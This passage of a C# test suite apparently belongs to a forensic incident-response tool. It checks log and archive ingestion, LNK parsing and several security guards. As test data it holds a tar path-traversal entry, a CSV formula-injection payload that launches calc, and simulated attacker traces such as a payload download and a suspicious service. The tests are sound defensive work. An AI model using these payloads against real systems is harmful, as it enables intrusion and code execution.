                    throw new InvalidOperationException(
                        "Malformed UAC hash lines were not surfaced.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException(
                    "UAC file-hash integration test failed: " +
                    (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeFolder_uac_web_logs_parse_access_error_gzip_and_time_semantics()
        {
            string dir = Path.Combine(Path.GetTempPath(), "ircol_uac_web_" +
                Guid.NewGuid().ToString("N"));
            try
            {
                string apache = Path.Combine(dir, "[root]", "var", "log",
                    "apache2");
                string nginx = Path.Combine(dir, "[root]", "var", "log",
                    "nginx");
                Directory.CreateDirectory(apache);
                Directory.CreateDirectory(nginx);
                File.WriteAllText(Path.Combine(dir, "uac.log"),
                    "2026-07-28 10:00:00 +0800 INF Unix-like Artifacts Collector\r\n" +
                    "2026-07-28 10:00:00 +0800 INF Operating system: linux\r\n" +
                    "2026-07-28 10:00:00 +0800 INF Hostname: UAC-WEB-01\r\n",
                    new UTF8Encoding(false));

                File.WriteAllText(Path.Combine(apache, "access.log"),
                    "203.0.113.10 - alice [28/Jul/2026:10:15:30 +0800] \"POST /upload?x=1 HTTP/1.1\" 201 512 \"https://ref.example/\" \"curl/8.0\"\r\n" +
                    "example.test:443 2001:db8::10 - bob [28/Jul/2026:02:16:00 +0000] \"GET /admin HTTP/2.0\" 403 123 \"-\" \"Mozilla/5.0\"\r\n" +
                    "192.0.2.1 - - [28/Jul/2026:02:16:30 +0000] \"GET /long HTTP/1.1\" 200 4 \"-\" \"" +
                    new string('u', 5000) + "\"\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(apache, "error.log"),
                    "[Mon Jul 28 10:16:01.123456 2026] [core:error] [pid 4321:tid 99] [client 203.0.113.11:54321] AH00124: Request exceeded limit\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(apache, "access.log.bad"),
                    "custom-json-format-without-supported-envelope\r\n",
                    new UTF8Encoding(false));

                using (var compressedFile = new FileStream(
                    Path.Combine(nginx, "access.log.1.gz"), FileMode.Create,
                    FileAccess.Write, FileShare.None))
                using (var compressed = new GZipStream(compressedFile,
                    CompressionMode.Compress))
                using (var writer = new StreamWriter(compressed,
                    new UTF8Encoding(false)))
                {
                    writer.WriteLine("198.51.100.5 - - [28/Jul/2026:02:17:00 +0000] \"GET /health HTTP/1.1\" 200 2 \"-\" \"monitor/1.0\"");
                }
                File.WriteAllText(Path.Combine(nginx, "error.log"),
                    "2026/07/28 10:17:01 [error] 123#123: *1 connect() failed (111: Connection refused) while connecting to upstream, client: 198.51.100.6, server: api.example, request: \"GET /api HTTP/1.1\", upstream: \"http://127.0.0.1:8080/api\", host: \"api.example\"\r\n",
                    new UTF8Encoding(false));

                CaseData c = CaseManager.LoadCaseFromFolder(dir);
                if (c == null || c.UacEvidence == null || !c.UacEvidence.IsUac)
                    throw new InvalidOperationException("UAC web evidence was not detected.");

                string csvPath = CaseManager.ResolveArtifactPath(c,
                    ArtifactNames.UacWebServerEventsCsv);
                if (!File.Exists(csvPath))
                    throw new InvalidOperationException("UAC web canonical CSV was not created.");
                List<Dictionary<string, string>> rows =
                    CorrelationCsvHelper.ReadCsv(csvPath);
                if (rows.Count != 6)
                    throw new InvalidOperationException("Unexpected UAC web row count: " +
                        rows.Count.ToString(CultureInfo.InvariantCulture));

                Dictionary<string, string> access = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "RequestTarget"),
                        "/upload?x=1", StringComparison.Ordinal));
                if (access == null ||
                    !string.Equals(CorrelationCsvHelper.Get(access, "TimeUtc"),
                        "2026-07-28T02:15:30.0000000Z", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(access, "RemoteAddress"),
                        "203.0.113.10", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(access, "Method"),
                        "POST", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(access, "StatusCode"),
                        "201", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(access, "User"),
                        "alice", StringComparison.Ordinal))
                    throw new InvalidOperationException("Apache combined access fields were not normalized.");

                Dictionary<string, string> vhost = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "VirtualHost"),
                        "example.test:443", StringComparison.Ordinal));
                if (vhost == null ||
                    !string.Equals(CorrelationCsvHelper.Get(vhost, "RemoteAddress"),
                        "2001:db8::10", StringComparison.Ordinal) ||
                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(vhost,
                        "RemotePort")))
                    throw new InvalidOperationException("Vhost/IPv6 access fields were not preserved.");

                Dictionary<string, string> longAgent = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "RequestTarget"),
                        "/long", StringComparison.Ordinal));
                if (longAgent == null ||
                    CorrelationCsvHelper.Get(longAgent, "UserAgent").Length != 4096 ||
                    CorrelationCsvHelper.Get(longAgent, "Details").IndexOf(
                        "canonical_field_truncated=true", StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Long web headers were not bounded with provenance.");

                Dictionary<string, string> apacheError = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "ProcessId"),
                        "4321", StringComparison.Ordinal));
                if (apacheError == null ||
                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(apacheError,
                        "TimeUtc")) ||
                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
                        "TimeParseStatus"), "local-time-no-offset",
                        StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
                        "RemoteAddress"), "203.0.113.11",
                        StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
                        "RemotePort"), "54321", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(apacheError,
                        "Severity"), "error", StringComparison.Ordinal))
                    throw new InvalidOperationException("Apache error fields/time boundary were not preserved.");

                Dictionary<string, string> nginxError = rows.FirstOrDefault(x =>
                    string.Equals(CorrelationCsvHelper.Get(x, "ProcessId"),
                        "123", StringComparison.Ordinal));
                if (nginxError == null ||
                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
                        "ServerType"), "nginx", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
                        "RemoteAddress"), "198.51.100.6",
                        StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
                        "VirtualHost"), "api.example", StringComparison.Ordinal) ||
                    !string.Equals(CorrelationCsvHelper.Get(nginxError,
                        "RequestTarget"), "/api", StringComparison.Ordinal) ||
                    !string.IsNullOrEmpty(CorrelationCsvHelper.Get(nginxError,
                        "TimeUtc")))
                    throw new InvalidOperationException("Nginx error context was not normalized.");

                string evidenceIndex = File.ReadAllText(CaseManager.ResolveArtifactPath(c,
                    ArtifactNames.UacEvidenceIndexCsv));
                string[] evidenceRows = evidenceIndex.Split(new string[] {
                    "\r\n", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                string gzipEvidence = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("access.log.1.gz",
                        StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(gzipEvidence) ||
                    gzipEvidence.IndexOf("\"normalized-source\"",
                        StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Gzip web log was not indexed as normalized.");
                string invalidEvidence = evidenceRows.FirstOrDefault(x =>
                    x.IndexOf("access.log.bad",
                        StringComparison.OrdinalIgnoreCase) >= 0);
                if (string.IsNullOrEmpty(invalidEvidence) ||
                    invalidEvidence.IndexOf("\"indexed-raw\"",
                        StringComparison.Ordinal) < 0)
                    throw new InvalidOperationException("Unsupported web format was not retained as indexed-raw.");

                FactStore store = FactStore.BuildFromCase(c);
                List<Fact> webFacts = store.Facts.Where(x =>
                    x.Source == UacWebServerEventNormalizer.SourceName).ToList();
                if (webFacts.Count != 6)
                    throw new InvalidOperationException("Unexpected UAC web fact count.");
                Fact accessFact = webFacts.FirstOrDefault(x =>
                    HasEntity(x, "RemoteIP", "203.0.113.10") &&
                    HasEntity(x, "HttpMethod", "POST") &&
                    HasEntity(x, "RequestTarget", "/upload?x=1") &&
                    HasEntity(x, "HttpStatus", "201"));
                if (accessFact == null ||
                    accessFact.Action != "HttpRequestObserved" ||
                    accessFact.TimeKind != FactTimeMetadata.EventTimeKind ||
                    accessFact.ParserNote.IndexOf("proxy",
                        StringComparison.OrdinalIgnoreCase) < 0)
                    throw new InvalidOperationException("Web access fact entities were not emitted.");

                Fact errorFact = webFacts.FirstOrDefault(x =>
                    x.Action == "WebServerErrorMessageObserved" &&
                    HasEntity(x, "ProcessId", "123"));
                if (errorFact == null || errorFact.Time != DateTime.MinValue ||
                    !errorFact.FallbackUsed)
                    throw new InvalidOperationException("Offset-less web error invented timeline time.");
                return true;
            }
            catch (Exception ex)
            {
                throw new InvalidOperationException("UAC web integration test failed: " +
                    (ex.Message ?? ""), ex);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool AnalyzeArchive_uac_tar_gz_ingests_complete_evidence()
        {
            string work = Path.Combine(Path.GetTempPath(), "ircol_uac_archive_" + Guid.NewGuid().ToString("N"));
            string source = Path.Combine(work, "source");
            string archive = Path.Combine(work, "uac-complete.tar.gz");
            string extractedCache = null;
            try
            {
                string top = Path.Combine(source, "uac-complete");
                Directory.CreateDirectory(Path.Combine(top, "live_response", "process"));
                Directory.CreateDirectory(Path.Combine(top, "live_response", "network"));
                Directory.CreateDirectory(Path.Combine(top, "live_response", "packages"));
                Directory.CreateDirectory(Path.Combine(top, "[root]", "var", "log"));
                Directory.CreateDirectory(Path.Combine(top, "[root]", "var", "log", "nginx"));
                Directory.CreateDirectory(Path.Combine(top, "[root]", "var", "lib", "example"));
                Directory.CreateDirectory(Path.Combine(top, "[root]", "etc", "systemd", "system"));
                Directory.CreateDirectory(Path.Combine(top, "[root]", "home", "alice"));

                File.WriteAllText(Path.Combine(top, "uac.log"),
                    "2026-07-27 01:00:00 +0800 INF UAC version: 3.2.0\r\n" +
                    "2026-07-27 01:00:00 +0800 INF Operating system: linux\r\n" +
                    "2026-07-27 01:00:00 +0800 INF System architecture: x86_64\r\n" +
                    "2026-07-27 01:00:00 +0800 INF Hostname: UAC-ARCHIVE-01\r\n" +
                    "2026-07-27 01:00:00 +0800 INF Profile: ir_triage\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "live_response", "process", "ps_-eo_pid_user_etime_args.txt"),
                    "2026-07-27 01:00:00\r\nPID USER ELAPSED COMMAND\r\n1 root 01:00 /sbin/init\r\n4242 alice 00:05 /usr/bin/curl https://example.test\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "live_response", "network", "ss_-tulpen.txt"),
                    "2026-07-27 01:00:00\r\nNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\r\n" +
                    "tcp ESTAB 0 0 10.0.0.5:4444 203.0.113.77:443 users:((\"curl\",pid=4242,fd=5))\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "live_response", "packages", "dpkg_-l.txt"),
                    "||/ Name Version Architecture Description\r\n" +
                    "ii  curl 8.10.1-1 amd64 command line transfer tool\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "var", "log", "auth.log"),
                    "Jul 27 00:59:00 uac-host sshd[777]: Accepted publickey for alice from 203.0.113.77 port 55222 ssh2\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "var", "log", "nginx", "access.log"),
                    "203.0.113.77 - alice [27/Jul/2026:00:59:30 +0800] \"GET /payload HTTP/1.1\" 200 42 \"-\" \"curl/8.10.1\"\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "etc", "passwd"),
                    "root:x:0:0:root:/root:/bin/bash\r\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "etc", "group"),
                    "root:x:0:\r\nalice:x:1000:alice\r\nsudo:x:27:alice\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "etc", "shadow"),
                    "root:!:20000:0:99999:7:::\r\nalice:$6$redacted-hash:20000:0:99999:7:::\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "home", "alice", ".bash_history"),
                    "#1785085200\r\ncurl https://example.test/payload\r\nwhoami\r\n",
                    new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(top, "[root]", "etc", "systemd", "system", "update-agent.service"),
                    "[Service]\nExecStart=/tmp/update-agent\n",
                    new UTF8Encoding(false));
                File.WriteAllBytes(Path.Combine(top, "[root]", "var", "lib", "example", "state.db"),
                    new byte[] { 0x00, 0x01, 0x02, 0x03 });
                File.WriteAllText(Path.Combine(top, ArtifactNames.UacAccountsCsv),
                    "RecordType,Name,Id,PrimaryGroupId,Home,Shell,Members,PasswordState,Description,SourcePath\r\n" +
                    "User,forged-archive-user,0,0,/root,/bin/sh,,set,forged,forged.csv\r\n",
                    new UTF8Encoding(false));

                Directory.CreateDirectory(work);
                WriteTarGzFromFolder(source, archive);

                CaseData c = CaseManager.LoadCaseFromPath(archive);
                if (c == null) return false;
                extractedCache = c.CachePath;
                if (!string.Equals(c.SourceFormat, "tar.gz", StringComparison.Ordinal)) return false;
                if (string.IsNullOrWhiteSpace(c.SourceEvidenceSha256) || c.SourceEvidenceSha256.Length != 64) return false;
                if (c.UacEvidence == null || !c.UacEvidence.IsUac) return false;
                if (!string.Equals(c.UacEvidence.Version, "3.2.0", StringComparison.Ordinal)) return false;
                if (c.UacEvidence.RawOnlyCount < 1 || c.UacEvidence.ParserEligibleCount < 3)
                    throw new InvalidOperationException("Unexpected UAC intake coverage counters: raw=" + c.UacEvidence.RawOnlyCount + ", eligible=" + c.UacEvidence.ParserEligibleCount + ".");
                if (!string.Equals(c.Hostname, "UAC-ARCHIVE-01", StringComparison.Ordinal)) return false;
                if (c.EvidenceFiles == null || c.EvidenceFiles.Count < 9) return false;
                string evidenceIndexPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacEvidenceIndexCsv);
                string accountsPath = CaseManager.ResolveArtifactPath(c, ArtifactNames.UacAccountsCsv);
                if (!File.Exists(evidenceIndexPath)) return false;
                if (!File.Exists(accountsPath)) return false;
                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacShellHistoryCsv))) return false;
                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPersistenceCsv))) return false;
                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacPackagesCsv))) return false;
                if (!File.Exists(CaseManager.ResolveArtifactPath(c, ArtifactNames.UacWebServerEventsCsv))) return false;
                string accountsCsv = File.ReadAllText(accountsPath);
                if (accountsCsv.IndexOf("redacted-hash", StringComparison.Ordinal) >= 0 ||
                    accountsCsv.IndexOf("forged-archive-user", StringComparison.Ordinal) >= 0)
                    return false;
                if (c.Artifacts == null || !c.Artifacts.Keys.Any(x => x.EndsWith("update-agent.service", StringComparison.OrdinalIgnoreCase))) return false;
                if (!c.Artifacts.Keys.Any(x => string.Equals(Path.GetFileName(x), ArtifactNames.UacArchiveEntriesCsv, StringComparison.OrdinalIgnoreCase))) return false;

                FactStore store = FactStore.BuildFromCase(c);
                c.FactStore = store;
                if (store == null || store.Facts == null) return false;
                if (!store.Facts.Any(x => x.Source == UacEvidenceIndexNormalizer.SourceName && HasEntity(x, "Hash", c.EvidenceFiles[0].Sha256))) return false;
                if (!store.Facts.Any(x => x.Source == UacAccountNormalizer.SourceName && HasEntity(x, "User", "alice"))) return false;
                Fact shell = store.Facts.FirstOrDefault(x => x.Source == UacShellHistoryNormalizer.SourceName &&
                    HasEntity(x, "CommandLine", "curl https://example.test/payload"));
                if (shell == null || shell.Time.Year < 2026) return false;
                if (!store.Facts.Any(x => x.Source == UacAuthEventNormalizer.SourceName && HasEntity(x, "RemoteIP", "203.0.113.77"))) return false;
                if (!store.Facts.Any(x => x.Source == UacNetworkConnectionNormalizer.SourceName && HasEntity(x, "ProcessName", "curl"))) return false;
                if (!store.Facts.Any(x => x.Source == UacPersistenceNormalizer.SourceName &&
                    HasEntity(x, "ServiceName", "update-agent.service") &&
                    HasEntity(x, "Path", "/tmp/update-agent"))) return false;
                if (!store.Facts.Any(x => x.Source == UacPackageNormalizer.SourceName &&
                    HasEntity(x, "ProductName", "curl") &&
                    HasEntity(x, "ProductVersion", "8.10.1-1"))) return false;
                if (!store.Facts.Any(x => x.Source == UacWebServerEventNormalizer.SourceName &&
                    HasEntity(x, "RemoteIP", "203.0.113.77") &&
                    HasEntity(x, "RequestTarget", "/payload"))) return false;

                SummaryPayload summary = AnalysisCli.BuildHeadlessSummary(c);
                string json = SummaryExport.Serialize(summary);
                string fullLogPath = Path.Combine(work, "uac-full-log.json");
                FactStorePersistence.ExportFullLogJson(new CaseData[] { c }, fullLogPath);
                string fullLog = File.ReadAllText(fullLogPath);
                if (json.IndexOf("\"source_format\":\"tar.gz\"", StringComparison.Ordinal) < 0) throw new InvalidOperationException("summary source_format missing");
                if (json.IndexOf("\"uac\":", StringComparison.Ordinal) < 0) throw new InvalidOperationException("summary UAC metadata missing");
                if (json.IndexOf("\"source_evidence_sha256\":", StringComparison.Ordinal) < 0) throw new InvalidOperationException("summary archive hash missing");
                if (fullLog.IndexOf("\"source_format\":\"tar.gz\"", StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log source_format missing");
                if (fullLog.IndexOf(UacShellHistoryNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log shell facts missing");
                if (fullLog.IndexOf(UacPersistenceNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log persistence facts missing");
                if (fullLog.IndexOf(UacPackageNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log package facts missing");
                if (fullLog.IndexOf(UacWebServerEventNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log web facts missing");
                if (fullLog.IndexOf(UacEvidenceIndexNormalizer.SourceName, StringComparison.Ordinal) < 0) throw new InvalidOperationException("full log evidence facts missing");
                return true;
            }
            finally
            {
                if (!string.IsNullOrEmpty(extractedCache)) TryDeleteDir(extractedCache);
                TryDeleteDir(work);
            }
        }

        private static bool ArchiveIntake_rejects_tar_path_traversal()
        {
            string work = Path.Combine(Path.GetTempPath(), "ircol_tar_guard_" + Guid.NewGuid().ToString("N"));
            string archive = Path.Combine(work, "bad.tar.gz");
            string destination = Path.Combine(work, "out");
            try
            {
                Directory.CreateDirectory(work);
                WriteSingleTarGzEntry(archive, "../escaped.txt", Encoding.UTF8.GetBytes("should-not-extract"));
                bool rejected = false;
                try { ArchiveIntake.ExtractSafely(archive, destination); }
                catch (InvalidDataException) { rejected = true; }
                return rejected && !File.Exists(Path.Combine(work, "escaped.txt"));
            }
            catch
            {
                return false;
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool FixtureCorpus_committed_files_match_builder_and_parse_as_expected()
        {
            var sb = new StringBuilder();
            int failed = FixtureCorpus.Validate(sb);
            // Surface the per-fixture detail under this test only when something fails.
            if (failed != 0) Console.Write(sb.ToString());
            return failed == 0;
        }

        // Build a minimal MS-SHLLINK LNK (header + LinkInfo, no IDList) carrying a LocalBasePath.
        internal static byte[] BuildLnkFixture(string path, bool unicode)
        {
            var header = new byte[76];
            BitConverter.GetBytes(0x4C).CopyTo(header, 0x00);                                  // HeaderSize
            new Guid("00021401-0000-0000-C000-000000000046").ToByteArray().CopyTo(header, 0x04); // LinkCLSID
            BitConverter.GetBytes(0x00000002).CopyTo(header, 0x14);                            // LinkFlags = HasLinkInfo

            byte[] pathBytes = unicode ? Encoding.Unicode.GetBytes(path + "\0") : Encoding.ASCII.GetBytes(path + "\0");
            int linkInfoHeaderSize = unicode ? 0x24 : 0x1C;
            int pathOffset = linkInfoHeaderSize;
            int linkInfoSize = linkInfoHeaderSize + pathBytes.Length;

            var li = new byte[linkInfoSize];
            BitConverter.GetBytes(linkInfoSize).CopyTo(li, 0x00);
            BitConverter.GetBytes(linkInfoHeaderSize).CopyTo(li, 0x04);
            BitConverter.GetBytes(0x00000001).CopyTo(li, 0x08);                                // VolumeIDAndLocalBasePath
            if (unicode) BitConverter.GetBytes(pathOffset).CopyTo(li, 0x1C);                   // LocalBasePathOffsetUnicode
            else BitConverter.GetBytes(pathOffset).CopyTo(li, 0x10);                           // LocalBasePathOffset (ANSI)
            pathBytes.CopyTo(li, pathOffset);

            var all = new byte[header.Length + li.Length];
            header.CopyTo(all, 0);
            li.CopyTo(all, header.Length);
            return all;
        }

        private static bool Lnk_parser_reads_unicode_and_ansi_local_base_path()
        {
            int consumed;
            // Modern jump-list LNK: LocalBasePath is Unicode at offset 0x1C — must be read there.
            byte[] uni = BuildLnkFixture("C:\\Users\\x\\secret.docx", true);
            string up = IR_Collect.Collectors.JumpListsCollector.TryParseLnkLocalPath(uni, 0, out consumed);
            if (!string.Equals(up, "C:\\Users\\x\\secret.docx", StringComparison.Ordinal)) return false;
            // Legacy ANSI LocalBasePath (offset 0x10) still parses.
            byte[] ansi = BuildLnkFixture("C:\\temp\\a.txt", false);
            string ap = IR_Collect.Collectors.JumpListsCollector.TryParseLnkLocalPath(ansi, 0, out consumed);
            return string.Equals(ap, "C:\\temp\\a.txt", StringComparison.Ordinal);
        }

        private static bool RunToFile_streams_output_and_cleans_on_failure()
        {
            string dir = CreateTempDir("IRCollectRunToFile_");
            try
            {
                // Success: output is streamed to the file.
                string ok = Path.Combine(dir, "ok.txt");
                Collector.CommandHelper.RunToFile("echo", "STREAMOK", ok);
                if (!File.Exists(ok) || File.ReadAllText(ok).IndexOf("STREAMOK", StringComparison.Ordinal) < 0) return false;

                // Failure: a non-zero exit must throw and leave NO partial file (all-or-nothing).
                string bad = Path.Combine(dir, "bad.txt");
                bool threw = false;
                try { Collector.CommandHelper.RunToFile("cmd", "/c exit 3", bad); }
                catch { threw = true; }
                return threw && !File.Exists(bad);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryRecord_args_governance_note_round_trips()
        {
            string dir = CreateTempDir("IRCollectMemNote_");
            try
            {
                string p = Path.Combine(dir, "memory_acquisition.json");
                var rec = new MemoryAcquisitionRecord { Status = "complete", ArgsGovernanceNote = MemoryHandoffHelper.ArgsGovernanceNote };
                MemoryAcquisitionRecord.SaveToFile(rec, p);
                var back = MemoryAcquisitionRecord.TryLoad(p);
                return back != null
                    && !string.IsNullOrEmpty(back.ArgsGovernanceNote)
                    && back.ArgsGovernanceNote.IndexOf("operator-supplied", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CsvExport_neutralizes_formula_injection()
        {
            // Dangerous leading chars get a single-quote prefix; field stays quoted.
            if (CsvUtils.EscapeFieldForExport("=cmd|'/c calc'!A1") != "\"'=cmd|'/c calc'!A1\"") return false;
            if (CsvUtils.EscapeFieldForExport("+1") != "\"'+1\"") return false;
            if (CsvUtils.EscapeFieldForExport("-2") != "\"'-2\"") return false;
            if (CsvUtils.EscapeFieldForExport("@x") != "\"'@x\"") return false;
            if (CsvUtils.EscapeFieldForExport("\tTabbed") != "\"'\tTabbed\"") return false;
            // Normal value: quoted, no prefix (forensic value unchanged).
            if (CsvUtils.EscapeFieldForExport("C:\\Windows\\system32") != "\"C:\\Windows\\system32\"") return false;
            // Embedded double-quote is doubled (RFC 4180).
            if (CsvUtils.EscapeFieldForExport("a\"b") != "\"a\"\"b\"") return false;
            // Null/empty -> empty quoted field.
            if (CsvUtils.EscapeFieldForExport("") != "\"\"") return false;
            if (CsvUtils.EscapeFieldForExport(null) != "\"\"") return false;
            return true;
        }

        private static bool ConfigAcl_hardening_keeps_file_readable_and_no_throw()
        {
            string dir = CreateTempDir("IRCollectCfgAcl_");
            try
            {
                string f = Path.Combine(dir, "config.ini");
                File.WriteAllText(f, "AiApiKey=secret123\nUploadApiKey=topsecret\n");
                ConfigManager.TryRestrictAclToCurrentUser(f); // best-effort; must not throw
                // We grant ourselves FullControl, so read-back must still work (not locked out).
                string back = File.ReadAllText(f);
                return back.IndexOf("AiApiKey=secret123", StringComparison.Ordinal) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool SqliteModule_unsigned_or_missing_dll_is_rejected()
        {
            string dir = CreateTempDir("IRCollectSqliteSig_");
            try
            {
                // A planted, unsigned System.Data.SQLite.dll must be refused (anti-DLL-planting gate).
                string dll = Path.Combine(dir, "System.Data.SQLite.dll");
                File.WriteAllBytes(dll, new byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x01, 0x02, 0x03, 0x04 }); // junk, unsigned
                if (FactStorePersistence.IsTrustedSqliteModule(dll)) return false;
                // A missing file is also rejected (fail-safe).
                if (FactStorePersistence.IsTrustedSqliteModule(Path.Combine(dir, "does_not_exist.dll"))) return false;
                return true;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool FactStore_AppendFacts_swaps_without_mutating_old_reference()
        {
            var store = new FactStore();
            var f1 = new Fact("a", DateTime.MinValue, "S1", "X");
            f1.EntityRefs.Add(new EntityRef("Path", "p1"));
            store.Facts.Add(f1);
            store.BuildEntityIndex();

            // References a concurrent reader would grab before a mutation.
            var oldFacts = store.Facts;
            var oldIndex = store.EntityIndex;

            var f2 = new Fact("b", DateTime.MinValue, "S2", "Y");
            f2.EntityRefs.Add(new EntityRef("Path", "p2"));
            store.AppendFacts(new List<Fact> { f2 });

            return oldFacts.Count == 1                         // old snapshot not mutated in place
                && oldIndex.Count == 1
                && !ReferenceEquals(store.Facts, oldFacts)     // references were swapped
                && !ReferenceEquals(store.EntityIndex, oldIndex)
                && store.Facts.Count == 2
                && store.GetByEntity("Path", "p1").Count == 1
                && store.GetByEntity("Path", "p2").Count == 1;
        }

        private static bool FactStore_concurrent_append_and_read_no_exception()
        {
            var store = new FactStore();
            var seed = new Fact("seed", DateTime.MinValue, "S", "X");
            seed.EntityRefs.Add(new EntityRef("Path", "p"));
            store.Facts.Add(seed);
            store.BuildEntityIndex();

            Exception readerError = null;
            int stop = 0;
            var reader = new System.Threading.Thread(delegate()
            {
                try
                {
                    while (System.Threading.Volatile.Read(ref stop) == 0)
                    {
                        var snap = store.Facts; // snapshot reference, then enumerate it
                        int n = 0;
                        foreach (var f in snap) { if (f != null && f.Source != null) n++; }
                        store.GetByEntity("Path", "p");
                        store.GetByTimeRange(DateTime.MinValue, DateTime.MaxValue);
                    }
                }
                catch (Exception ex) { readerError = ex; }
            });
            reader.IsBackground = true;
            reader.Start();

            for (int i = 0; i < 300 && readerError == null; i++)
            {
                var f = new Fact("f" + i, DateTime.MinValue, "S", "X");
                f.EntityRefs.Add(new EntityRef("Path", "p" + i));
                store.AppendFacts(new List<Fact> { f });
            }
            System.Threading.Volatile.Write(ref stop, 1);
            reader.Join(5000);
            return readerError == null && store.Facts.Count >= 300;
        }

        private static string SerializeFactJson(Fact f)
        {
            var ser = new System.Runtime.Serialization.Json.DataContractJsonSerializer(typeof(Fact));
            using (var ms = new MemoryStream())
            {
                ser.WriteObject(ms, f);
                return Encoding.UTF8.GetString(ms.ToArray());
            }
        }

        private static bool FactStoreLoad_skips_bad_rows_keeps_good()
        {
            string json = SerializeFactJson(new Fact("id1", new DateTime(2024, 1, 1, 0, 0, 0, DateTimeKind.Utc), "EventLog", "Observed"));
            var rows = new List<Dictionary<string, object>>
            {
                // good
                new Dictionary<string, object> { { "Id", "id1" }, { "Time", "2024-01-01T00:00:00Z" }, { "Source", "EventLog" }, { "DetailsJson", json }, { "SchemaVersion", FactStorePersistence.SchemaVersion } },
                // bad: missing SchemaVersion
                new Dictionary<string, object> { { "Id", "id2" }, { "DetailsJson", json } },
                // bad: unparseable DetailsJson (valid schema)
                new Dictionary<string, object> { { "Id", "id3" }, { "DetailsJson", "{ not json" }, { "SchemaVersion", FactStorePersistence.SchemaVersion } },
                // bad: null DetailsJson (valid schema)
                new Dictionary<string, object> { { "Id", "id4" }, { "DetailsJson", null }, { "SchemaVersion", FactStorePersistence.SchemaVersion } },
            };
            int skipped;
            FactStore store = FactStorePersistence.BuildStoreFromRows(rows, "case", "host", "", out skipped);
            return store != null && store.Facts.Count == 1 && skipped == 3;
        }

        private static bool FactStoreLoad_unsupported_schema_throws()
        {
            var rows = new List<Dictionary<string, object>>
            {
                new Dictionary<string, object> { { "DetailsJson", "{}" }, { "SchemaVersion", 999999 } },
            };
            try { int s; FactStorePersistence.BuildStoreFromRows(rows, "c", "h", "", out s); return false; }
            catch (InvalidDataException) { return true; }
        }

        private static bool FactStoreLoad_all_unreadable_rows_throws()
        {
            var rows = new List<Dictionary<string, object>>
            {
                new Dictionary<string, object> { { "DetailsJson", null }, { "SchemaVersion", FactStorePersistence.SchemaVersion } },
                new Dictionary<string, object> { { "DetailsJson", "garbage" }, { "SchemaVersion", FactStorePersistence.SchemaVersion } },
            };
            try { int s; FactStorePersistence.BuildStoreFromRows(rows, "c", "h", "", out s); return false; }
            catch (InvalidDataException) { return true; }
        }

        private static bool EventLogLabel_strips_suffix_case_insensitive()
        {
            string input = "Security_FILTERED.CSV";
            string label = ArtifactNames.GetEventLogLabelFromFileName(input);
            return string.Equals(label, "Security", StringComparison.Ordinal);
        }

        private static bool EventLogLabel_keeps_non_suffix_name()
        {
            string input = "Security_filtered.csv.bak";
